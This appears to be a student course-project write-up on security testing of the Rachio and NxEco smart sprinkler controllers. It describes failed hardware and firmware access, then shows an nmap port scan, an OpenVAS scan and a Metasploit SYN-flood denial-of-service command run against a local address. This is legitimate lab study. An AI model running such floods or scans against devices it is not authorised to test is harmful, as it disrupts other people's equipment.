# UCLA ECE 209AS: Special Topics in Circuits and Embedded Systems
Hacking Rachio, the Smart WiFi Sprinkler Controller

## What is Rachio?
Rachio is the Smart Sprinkler Controller that gives you control of your sprinklers and watering bill, right from your smart phone.
<img src="https://github.com/ffrqw/ECE209AS/blob/master/images/rachio.jpg?raw=true" width="300">

## Security Attack Model Navigation
We navigated security attack models of Rachio following the guidance of 
### Hardware  
- Serial ports exposed  
- Insecure authentication mechanism used in the serial ports  
- Ability to dump the firmware over JTAG or via Flash chips  

**Attempt**: Access to the circuit board.  
**Result**: Failed. The device is well packaged with no screws. The only way to open it is smashing the shell. But we don’t have proper tools to do so.  
![Rachio well encasulated]()

### Firmware
- Ability to modify firmware  
- Hardcoded sensitive values in the  firmware—API keys,
passwords, staging URLs, etc.  
- Ability to understand the entire functionality of the device
through the firmware  
- File system extraction from the firmware  

**Attempt**: Download from official website.  
**Result**: Failed. Refuse to provide.  

**Attempt**: Draw from hardware.  
**Result**: Failed. Due to the same reason in hardware part.  


### Penetration Testing 

In our Penetration testing, we compared Rachio with NxEco, another popular smart sprinkle device. We conducted our test under the same WIFI. Based on this condition, we did reconnaissance on the devices and tried to find infomation about OS of the devices. Then we did vulunrability analysis with OpenVAS and found a potential vulunrability that the devices are using tcp connection that may be attacked by DoS(Denial of Service). Finally we executed a DoS attack to see if the vulunrability exists.
Here are the implementations.

**Port Scanning**
- Metasploit Nmap  


```
root@kali:~# nmap -v -sV -oA port_scanning 192.168.1.0/29
```

- Results  

NxEco  

<img src="https://github.com/ffrqw/ECE209AS/blob/master/images/nxeco_scan.png?raw=true" width="500">


Rachio  

<img src="https://github.com/ffrqw/ECE209AS/blob/master/images/rachio_scan.png?raw=true" width="500">

**Vulunrablity Analysis**
- OpenVAS

*Results*  

NxEco  

<img src="https://github.com/ffrqw/ECE209AS/blob/master/images/nxeco_edit.png?raw=true" width="500">

<img src="https://github.com/ffrqw/ECE209AS/blob/master/images/nxeco.png?raw=true" width="500">

Rachio  

<img src="https://github.com/ffrqw/ECE209AS/blob/master/images/rachio_edit.png?raw=true" width="500">

<img src="https://github.com/ffrqw/ECE209AS/blob/master/images/rachio.png?raw=true" width="500">


**DoS Attack**
- Metasploit auxiliary module attack

```
msf > use auxiliary/dos/tcp/synflood 
msf auxiliary(dos/tcp/synflood) > set RHOST 192.168.1.9
RHOST => 192.168.1.9
msf auxiliary(dos/tcp/synflood) > run
```
*Results*  

NxEco  

<img src="https://github.com/ffrqw/ECE209AS/blob/master/images/nxeco_flood.png?raw=true" width="500">

Rachio  

<img src="https://github.com/ffrqw/ECE209AS/blob/master/images/rachio_flood.png?raw=true" width="500">


### Mobile application
- Reverse engineering the mobile app  
- Dumping source code of the mobile application  
- Side channel data leakage  
- Runtime manipulation attacks  
- Insecure network communication  
- Outdated 3rd party libraries and SDKs  
**Attempt**:
Analyze the Android app.

## TODO
- Intercept HTTP packet from Rachio server to Rachio controller (use dSniff).
- Analyze app code (use jDax and Inspeckage).
- kill TCP connection.
  
## Reference
【1】IoT Hackers Handbook: An ultimate guide to hacking the Internet of Things
【2】https://www.kali.org/
